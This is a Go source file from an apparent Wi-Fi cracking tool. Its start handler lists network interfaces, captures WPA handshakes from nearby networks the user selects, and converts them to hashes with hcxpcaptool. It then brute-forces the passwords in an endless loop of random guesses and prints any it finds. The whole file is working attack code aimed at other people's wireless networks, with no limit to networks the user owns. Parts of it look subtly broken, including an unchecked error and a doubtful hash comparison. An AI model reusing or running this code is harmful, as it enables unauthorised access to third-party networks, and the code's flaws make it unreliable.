package commands

import (
	"checkWifi/pkg/networkDevices"
	"checkWifi/pkg/networks"
	"checkWifi/pkg/password"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
)

type StartHandler struct {
}

func CreateDefaultStartHandler() HandleFunction {
	return &StartHandler{}
}

func (s *StartHandler) Init() error {
	var countNetwork int64
	var networkDevice string

	networkDevicesFormated, err := networkDevices.FormatNetworkDevices(networkDevices.GetTopNetworkDevicesLinux())
	if err != nil {
		return err
	}

	fmt.Println(strings.Join(networkDevicesFormated, "\n"))
	fmt.Println("Select Network device: ")
	_, err = fmt.Scan(&networkDevice)
	if err != nil {
		return err
	}
	fmt.Println("Select count of network for check: ")

	_, err = fmt.Scan(&countNetwork)
	if err != nil {
		return err
	}

	networksNotFormat, err := networks.GetNetworks(networkDevice, countNetwork)

	fmt.Println("NETWORKS FOR START RE-CATCH HANDSHAKE: ", strings.Join(networks.FormatNetworks(networksNotFormat), "\n"))

	var mx sync.WaitGroup
	for _, network := range networksNotFormat {
		mx.Add(1)
		go func() {
			err = network.LoadHandshake(networkDevice)
			if err != nil {
				fmt.Println(err)
			}
			defer mx.Done()
		}()
	}
	mx.Wait()

	var networkHashMap = make(map[string]networks.Network, 0)
	for _, network := range networksNotFormat {
		hash, err := extractHashFromCap(network.HandshakeCap)
		if err != nil {
			continue
		}
		networkHashMap[hash] = network
	}
	for len(networkHashMap) > 0 {
		passwords, err := password.GenerateRandomPasswords(1000)
		if err != nil {
			return err
		}
		for _, pwd := range passwords {
			for _, network := range networksNotFormat {
				hash := password.Hash(pwd, network.Name)
				if network, ok := networkHashMap[string(hash)]; ok {
					fmt.Println(fmt.Sprintf("NETWORK PASSWORD IS FOUND!!! : %s:%s", network.Name, pwd))
					delete(networkHashMap, string(hash))
				}
			}
		}

	}
	return nil
}

func extractHashFromCap(capPath string) (string, error) {
	// Конвертация .cap в .hccapx (формат для hashcat)
	cmd := exec.Command("hcxpcaptool", "-o", "output.hccapx", "-z", "temp.hash", capPath)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("Ошибка конвертации: %v, %s", err, string(out))
	}

	// Читаем хэш из файла
	hashBytes, err := os.ReadFile("temp.hash")
	if err != nil {
		return "", fmt.Errorf("Ошибка чтения хэша: %v", err)
	}

	// Можно сразу удалить временный файл
	os.Remove("temp.hash")
	os.Remove("output.hccapx")

	return string(hashBytes), nil
}
